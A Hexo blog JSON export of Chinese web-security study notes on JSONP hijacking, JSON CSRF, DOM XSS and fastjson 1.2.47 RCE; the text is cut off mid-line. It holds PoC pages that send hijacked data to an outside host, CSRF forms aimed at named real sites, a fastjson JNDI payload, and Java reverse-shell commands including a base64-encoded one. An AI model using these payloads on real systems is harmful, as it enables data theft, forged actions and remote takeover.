{"meta":{"title":"吾善养浩然气","subtitle":"遇事不决，可问春风","description":"纯净水@流云-自留地","author":"blackj liuyun","url":"http://yoursite.com"},"pages":[{"title":"about","date":"2019-07-26T10:40:05.000Z","updated":"2019-07-26T10:40:05.075Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"About Me","date":"2018-12-28T10:24:42.000Z","updated":"2019-07-21T04:17:41.254Z","comments":true,"path":"about/index2.html","permalink":"http://yoursite.com/about/index2.html","excerpt":"","text":"给小破邮丢人的Web汪，一直在路上"},{"title":"categories","date":"2018-09-22T17:42:49.000Z","updated":"2019-07-21T04:30:49.079Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"说明常规渗透XXEXSS业务逻辑ceshi内网渗透内网穿透内网测试信息收集测试1111111111211123区块链安全"},{"title":"friends","date":"2019-07-26T08:14:14.000Z","updated":"2019-07-26T08:15:33.766Z","comments":true,"path":"friends/index.html","permalink":"http://yoursite.com/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-22T18:05:33.000Z","updated":"2019-07-21T04:30:48.883Z","comments":true,"path":"tags/index-1.html","permalink":"http://yoursite.com/tags/index-1.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-22T18:03:46.000Z","updated":"2019-07-21T04:30:48.766Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"title: 区块链安全date: 2018-09-23 02:03:46 type: “tags”"}],"posts":[{"title":"json与jsonp的学习与分析","slug":"安全策略/json","date":"2019-07-21T04:44:08.733Z","updated":"2019-07-21T04:44:08.852Z","comments":true,"path":"2019/07/21/安全策略/json/","link":"","permalink":"http://yoursite.com/2019/07/21/安全策略/json/","excerpt":"","text":"[TOC] json与jsonp的学习与分析json和jsonp的区别避免在后续的工作中把json和jsonp搞混，这里说明下其区别 json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求 json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。 &lt;script&gt; function test(data){ //alert(v.name); var xmlhttp = new XMLHttpRequest(); var url = &quot;http://xx.xx.xx.xx/&quot; + JSON.stringify(data); xmlhttp.open(&quot;GET&quot;,url,true); xmlhttp.send(); } &lt;/script&gt; &lt;script src=&quot;http://xx.xx.xx.xx/1.php?callback=test&quot;&gt;&lt;/script&gt; jsonp 简介json padding 将json数据填充进回调函数；在客户端创建一个回调函数并将回调函数名传给服务端，服务端根据定义的回调函数名的方法，将获取的json数据传入方法，完成回调。 jsonp 风险jsonp劫持利用条件 只使用csrf-token进行csrf校验 获取csrf token这类跨域问题，CORS、PostMessage以及jsonp，这里我们先讨论jsonp的情况，在遇到这类时，可以先尝试检查是否存在泄漏token的jsonp。 利用方式 测试方法，在get url中添加jsonp常用回调函数（可以根据具体的情况判断），常用函数名的变量名如下：callback、jsonpcallback、func 通过jsonp获取到后端身份校验token，构造CSRF页面 嵌入获取到的token值，进行后段绕过校验CSRF攻击。利用示例：&lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&quot; method=&quot;POST&quot; id=&quot;csrfsend&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;bid&quot; value=&quot;9947&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;tid&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;这是测试结果&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;这是测试标题&quot;&gt; &lt;input type=&quot;hidden&quot; id=&quot;token&quot; name=&quot;_csrf_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;anonymous&quot; value=&quot;1&quot;&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt; function hehehe(obj){ console.log(obj); var csrf_token = obj[&quot;result&quot;][&quot;data&quot;][&quot;_csrf_token&quot;]; document.getElementById(&quot;token&quot;).value = csrf_token; document.getElementById(&quot;csrfsend&quot;).submit(); } &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&amp;callback=hehehe&amp;bid=9947&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 防范措施 referer限制（注意referer过滤是否正则可绕过如http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer） 随机token callback可自定义导致的安全问题 典型案例Content-Type与XSS漏洞利用条件 输出json时，没有严格定义Content-Type（Content-Type: application/json） callback 输出点没有进行过滤处理 利用方式防范 严格定义Content-Type: application/json Content-Type校验不严漏洞 在python Bottle中出现过这个问题，对应的cve编号CVE-2014-3137，在该漏洞中Bottle框架会接受诸如“text / plain; application / json”作为json内容 application/json类型，攻击者可能会使用它来绕过安全机制，例如，Chrome不允许将内容类型设置为“application / json”的跨源xmlhttprequests，但在bottel中可以将其设置为“text / plain; application / json”绕过。 绕过形式 Content-Type防御解析HTML的事件，例如在IE6、7等版本请求的URL文件后加一个/x.html就可以解析 http://127.0.0.1/getUsers.php/x.html?callback=＜script＞alert(/xss/)＜/script＞ 过滤callback以及JSON数据输出注意 旧版ie中的utf7-BOM导致的问题 MHTML与JSONPMHTML（MIME HTML协议）协议解析跨域漏洞，这个有点老，先不管 FLASH与JSONP这个也是早年的漏洞问题了，这里要稍微注意下content-type与jsonp的关系，执行jsonp的状态下 Content-Type = &#39;application/json;charset=UTF-8&#39; Content-Type = &#39;text/json;charset=UTF-8&#39; Content-Type = &#39;text/javascript;charset=UTF-8&#39; Content-Type =&#39;application/javascript;charset=UTF-8&#39; 严格来说json格式也属于js对象的子集，严格的JavaScript对象表示法来表示结构化的数据，所以使用content-type为javascript时，服务端也认可客户端提交的json格式数据。 FLASH的调用及域 html调用flash，flash可以改后缀名(swf改成gif等)。 flash可以单独访问，但是其效果类似与html调用同域的flash，但只这个后缀必须是swf。 flash发动请求时，是根据flash的域来判断的，而不是html来判断： flash请求同域资源时，直接忽视crossdomain.xml。 flash（跨域传输数据）请求外域资源时，受外域下crossdomain.xml里的策略限制。 在CSRF的防御策略上，一般是通过referer以及token校验，但在借用flash上传的时候，可以绕过CSRF的referer和token限制。在只有referer校验的CSRF，就可以直接用 上传flash利用，在有token校验的时候，就要劫持token，在用到jsonp，就可以用jsonp劫持token，进一步利用 利用思路利用思路如下： 将flash文件上传到存在上传处的目标网站中 用户触发该flash中的csrf代码，由于flash请求同源资源时，直接忽视crossdomain.xml,flash发送的请求的Referer是flash的因此referer校验无效，在存在jsonp劫持的条件下，可以获取用户token，这个时候token校验值也无效了。通过flash上传+jsonp劫持绕过referer校验和token校验达到CSRF。 利用验证在利用这个jsonp之前，先来了解一下swf-json-csrf 利用环境 支持旧版本flash浏览器GET以及POST请求可用： chrome 61.0及以前 firefox 52.0.1及以前 Opera 47.0及以前 Safari 11.0及以前 开启referer验证+token验证 利用JSONP进行水坑攻击这个是乌云里面一篇较早的文章了，水坑攻击者在有漏洞的网站上部署上可触发获取别的网站有用信息的js，如：攻击者在A网站上插入了可执行的js，建立水坑；js利用callback获取第三方网站B上的对应用户信息；将获取的信息解析发送给攻击者自己的接收平台。 JSON风险目标是 利用FLASH利用JSON跨站点请求伪造 JSON格式的CSRF当数据内容提交为json格式的报文时，CSRF和常规的CSRF就不一样了，即便这个CSRF没有校验referer和token，这个时候post的数据用form形式提交，将json内容放在name属性中，这个时候会有一个value值，当这个value值为空的时候，数值会有一个”=”，正常情况下服务端json解析器在校验的时候可能会拒绝这个请求（不符合格式）。 随意在burp里面翻了个包来测试 效果如下： POST /get_flags_async HTTP/1.1 Host: experiment.appadhoc.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Referer: https://blog.csdn.net/ Content-Type: application/json;charset=UTF-8 Content-Length: 551 Origin: https://blog.csdn.net Connection: close {&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{}} 借用burp生成的csrf的POC，将json内容置为name，value置为空 &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt; &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;{&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{}}&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 请求内容如下： POST /get_flags_async HTTP/1.1 Host: experiment.appadhoc.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Referer: http://burp/ Content-Type: text/plain Content-Length: 554 Connection: close Upgrade-Insecure-Requests: 1 {&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{}}= 返回结果：json解析器并不解析，并且Content-Type为也由原本的application/json转换为text/plain类型 HTTP/1.1 400 Bad Request Server: nginx/1.12.2 Date: Fri, 22 Feb 2019 07:52:08 GMT Content-Type: text/plain; charset=UTF-8 Content-Length: 77 Connection: close Access-Control-Allow-Origin: * The request content was malformed: unknown token = Near: e&quot;:&quot;&quot;},&quot;custom&quot;:{}}= 服务器查找json格式的数据但不验证Content-type对于服务器查找json格式的数据但不验证Content-type的情况，可以尝试以下方法(使用Content-type：text / plain来实现)： 方法一 fetch api的调用&lt;html&gt; &lt;title&gt;JSON CSRF POC&lt;/title&gt; &lt;body&gt; &lt;center&gt; &lt;h1&gt; JSON CSRF POC &lt;/h1&gt; &lt;script&gt; fetch(&#39;http://vul-app.com&#39;, {method: &#39;POST&#39;, credentials: &#39;include&#39;, headers: {&#39;Content-Type&#39;: &#39;text/plain&#39;}, body: &#39;{&quot;name&quot;:&quot;attacker&quot;,&quot;email&quot;:&quot;attacker.com&quot;}&#39;}); &lt;/script&gt; &lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 方法二 hackerone 上的方法&lt;html&gt; &lt;head&gt; &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $( document ).ready(function() { $(&quot;#z&quot;).attr(&quot;name&quot;,&#39;{&quot;entity&quot;:&quot;https://zzz.com&quot;,&quot;type&quot;:&quot;domain&quot;,&quot;time&quot;:&quot;&#39;+($.now()/1000)+&#39;&quot;,&quot;project&quot;:&quot;&lt;&lt;LAST_PROJECT&gt;&gt;&quot;,&quot;is_debugging&quot;:false,&quot;plugin&quot;:&quot;chrome-wakatime/1.0.2&quot;,&quot;fakeparam&quot;:&quot;&#39;); $(&quot;#f&quot;).submit(); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form id=&quot;f&quot; ENCTYPE=&quot;text/plain&quot; action=&quot;https://api.wakatime.com/api/v1/users/current/heartbeats&quot; method=&quot;post&quot;&gt; &lt;input id=&quot;z&quot; type=&quot;hidden&quot; name=&#39;test&#39; value=&#39;test&quot;}&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 给value赋予一个值，构造正常的json数据包形式一：用单引号构造 &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt; &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;input name=&#39;{&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://blog.csdn.net/&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{},&quot;test&quot;:&quot;&#39; value=&#39;test&quot;}&#39; type=&#39;hidden&#39;&gt; &lt;input type=submit&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 请求数据： POST /get_flags_async HTTP/1.1 Host: experiment.appadhoc.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Content-Type: text/plain Content-Length: 124 Connection: close Upgrade-Insecure-Requests: 1 {&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{},&quot;test&quot;:&quot;=test&quot;} 返回200 服务器查找json格式的数据并验证Content-type，即application/json但在校验Content-type的情况下，这个时候上述方法就行不不通了。这个时候可以用ajax来自定义数据头，XHRHTTPREQUEST修改Content-Type,改成application/json &lt;html&gt; &lt;body&gt; &lt;script&gt; function submitRequest() { var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;http://www.xxx.com/webnet/edit&quot;, true); xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;); xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;); xhr.withCredentials = true; xhr.send(JSON.stringify({&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;})); } &lt;/script&gt; &lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 但是这个有个缺陷，使用xmlhttprequest的时候，会先发一个OPTIONS请求预检(非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求,即浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错)，在使用XHR的时候空域状态下会有跨域限制。这里涉及到cors跨域限制的问题，详情可以看看‘https://my.oschina.net/hccake/blog/886602&#39; 预检请求： OPTIONS /get_flags_async HTTP/1.1 Host: experiment.appadhoc.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Access-Control-Request-Method: POST Access-Control-Request-Headers: content-type Origin: null Connection: close 其中如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。报错： Access to XMLHttpRequest at &#39;https://experiment.appadhoc.com/get_flags_async&#39; from origin &#39;null&#39; has been blocked by CORS policy: Response to preflight request doesn&#39;t pass access control check: The value of the &#39;Access-Control-Allow-Origin&#39; header in the response must not be the wildcard &#39;*&#39; when the request&#39;s credentials mode is &#39;include&#39;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute. 服务器设置允许任意域名跨域请求与可携带cookie进行了冲突，这个问题是后端配置的问题（axios默认是发送请求的时候不会带上cookie的，需要通过设置withCredentials: true来解决。 这个时候需要注意需要后端配合设置实际的origin，不能为* ） 遇到cors跨域请求不通过的时候flash + 307 跳转就可以派上用场了。 flash + 307 即SWF_JSON_CSRF-待补充参考 https://github.com/sp1d3r/swf_json_csrf as编辑swf文件编辑修改swf文件这里我用的是ffdec构造payload如下`package{ import flash.display.Sprite; import flash.net.URLLoader; import flash.net.URLRequest; import flash.net.URLRequestHeader; import flash.net.URLRequestMethod; public class re extends Sprite { public function re() { var member1:Object = null; var myJson:String = null; Wonderfl.capture(stage); super(); Wonderfl.capture(stage); member1 = new Object(); member1 = { &quot;name&quot;:&quot;attacker&quot;, &quot;email&quot;:&quot;attacker@gmail.com&quot; }; var myData:Object = member1; myJson = JSON.stringify(myData); myJson = JSON.stringify(myData); var url:String = &quot;http://xxxxx.ceye.io&quot;; var request:URLRequest = new URLRequest(url); request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;)); request.data = myJson; request.method = URLRequestMethod.POST; var urlLoader:URLLoader = new URLLoader(); try { urlLoader.load(request); return; } catch(e:Error) { trace(e); return; } } }} - php307 跳转 由于307跳转会带上原有的数据格式和类型，所以使用307跳转 如： &lt;?php // redirect automatically header(“Location: https://xx.xxx.xx/xx&quot;, true, 307); ?&gt; # 参考 http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.htmlhttps://my.oschina.net/hccake/blog/886602https://www.freebuf.com/articles/web/164234.htmlhttps://www.cnblogs.com/blacksunny/p/7930126.htmlhttp://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/https://github.com/sp1d3r/swf_json_csrfhttps://github.com/bottlepy/bottle/issues/616https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.htmlhttps://www.csdn.net/article/2015-07-14/2825207https://book.2cto.com/201310/34316.htmlhttp://blog.knownsec.com/2014/06/flashupload_csrf_attacking/http://cm2.pw/` 补充CORS与JSONP的区别-待补充JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。","categories":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/categories/Web渗透/"},{"name":"安全策略","slug":"Web渗透/安全策略","permalink":"http://yoursite.com/categories/Web渗透/安全策略/"}],"tags":[]},{"title":"DOM XSS从javascript中输出数据到HTML页面","slug":"xss/DOM-XSS漏洞挖掘与攻击面延伸","date":"2019-07-21T04:31:46.284Z","updated":"2019-07-21T04:31:46.375Z","comments":true,"path":"2019/07/21/xss/DOM-XSS漏洞挖掘与攻击面延伸/","link":"","permalink":"http://yoursite.com/2019/07/21/xss/DOM-XSS漏洞挖掘与攻击面延伸/","excerpt":"","text":"DOM XSS从javascript中输出数据到HTML页面 存储或反射型XSS是从服务端输出到HTML页面 常见位置URL代入页面定义：通过js直接获取url中的参数，然后输出到HTML页面 通过window.location.search获取页面url传递的参数 function GetQueryString(name) { var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;); var r = decodeURI(window.location.search.substr(1)).match(reg); if (r != null)return unescape(r[2]); return null; } var sname = GetQueryString(&quot;name&quot;); if(sname!=null){ var sname_ = decodeURIComponent(sname); alert(sname_); } #获取具体参数 document.getElementById(&#39;foo&#39;).innerHTML = getUrlParam(&#39;foo&#39;) #dom型XSS问题 此时取值时，匹配的URL是location.href，这个值包含了 location.search 和 location.hash 的值，而 location.hash 的值是不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值 location.search:获取问号后面的参数如： http://www.runoob.com/submit.htm?email=someone@ example.com 通过document.write(location.search);获取到的是 ?email=someone@example.com location.hash:获取url的锚部分，从“#”开始到最后，都是锚部分，不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值。 跳转类在 javascript 语法中，使用如下代码可以将页面进行跳转操作 location.href = urlparams.redirecturl; &lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; function jump(){ window.location.href=&quot;javascript:alert(1)&quot;; } &lt;/script&gt; &lt;button type=&quot;button&quot; onclick=&quot;jump()&quot;&gt;test&lt;/button&gt; &lt;/body&gt; &lt;/html&gt; 附： //顶层窗口跳转 //top.location.href=&#39;http://www.baidu.com&#39;; //父层窗口跳转 //parent.location.href=&#39;http://www.baidu.com&#39;; //以下均为本页面跳转 //window.location.href=&quot;http://www.baidu.com&quot;; //location.href=&quot;http://www.baidu.com&quot;; //self.location.href=&quot;http://www.baidu.com&quot;; //this.location.href=&quot;http://www.baidu.com&quot;; //location.href=&quot;http://www.baidu.com&quot;; document.location.href 这样的跳转通常会出现在登录页、退出页、中间页。如果开发者让用户可以控制 redirecturl 参数，就可以使用 javascript:alert(1) 的形式进行XSS攻击。最近几年的APP开发比较热门，通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多。 测试关注点 输入点 document.location document.URL document.URLUnencoded document.referrer window.location（href hash） 所有的inputs window.name document.cookie XMLhttpRequest返回的数据 localstorage ····· 以下几个地方是js输出到HTML的必经之路 输出点 document.write() document.writeln() xxx.innerHTML= xxx.outerHTML= innerHTML.replace= document.attachEvent() window.attachEvent() document.location.replace() document.location.assign() 缓存类开发者在缓存前端数据的时候，通常会存在 sessionStorage , localStorage , cookie 中，因为 sessionStorage 在页面刷新时就失效的特性，利用方式相对简单的只有后面两种。 参考学习 https://code.google.com/archive/p/domxsswiki/ domxss 备忘单 https://cstcamaro.github.io/post/2018-ISC-%E6%BC%94%E8%AE%B2%E7%A8%BF?tdsourcetag=s_pctim_aiomsg http://blog.nsfocus.net/xss-advance/#23_DOM","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/categories/Web安全/"},{"name":"XSS","slug":"Web安全/XSS","permalink":"http://yoursite.com/categories/Web安全/XSS/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"}]},{"title":"fastjson 1.2.47 rce","slug":"Web渗透/漏洞学习/fastjson","date":"2019-07-18T14:00:00.000Z","updated":"2019-07-26T07:24:36.670Z","comments":true,"path":"2019/07/18/Web渗透/漏洞学习/fastjson/","link":"","permalink":"http://yoursite.com/2019/07/18/Web渗透/漏洞学习/fastjson/","excerpt":"","text":"[TOC] fastjson 1.2.47 rce在渗透测试中 发现了fastjson的有漏洞的版本， 想着尝试下 危害恶意攻击者可以构造攻击请求绕过FastJSON的黑名单策略。例如，攻击者通过精心构造的请求，远程让服务端执行指定命令 对应payload{ \"name\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"x\": { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://ip:port/Exploit\", \"autoCommit\": true } } 此处简单测试了利用该命令漏洞会去请求exploit。这个漏洞的利用方式跟18年的fastjson反序列化漏洞比较类似，这里先看下18年的fastjson漏洞，跟着分析下 FastJson-JdbcRowSetImpl搭建漏洞环境根据FastJson-JdbcRowSetImpl搭建该漏洞环境，进行测试, 该漏洞环境 开启http服务Python3 -m http.server 80 生成Payloadjava -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar &lt;HTTP服务地址&gt; 指定RMI端口 触发 poc 如下 import java.lang.Runtime; import java.lang.Process; public class CommandObject { public CommandObject(){ try{ Runtime rt = Runtime.getRuntime(); //Runtime.getRuntime().exec(\"bash -i >&amp; /dev/tcp/ip/8550 0>&amp;1\"); //String[] commands = {\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}\"}; String[] commands = {\"ping\",\"xxxx.ceye.io\"}; Process pc = rt.exec(commands); System.out.println(\"11111\"); pc.waitFor(); }catch(Exception e){ e.printStackTrace(); System.out.println(\"2222\"); } } public static void main(String[] argv){ CommandObject e = new CommandObject(); } } 反弹shell 测试String[] commands = {&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;}; 将此处直接修改为该命令，发现结果不行，直接运行该commandobject程序结果发现是zsh 不支持，切换个,网上一堆用如下java反弹shell的写法，结果发现在1.8的jdk，一直不符合格式 String[] commands = [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 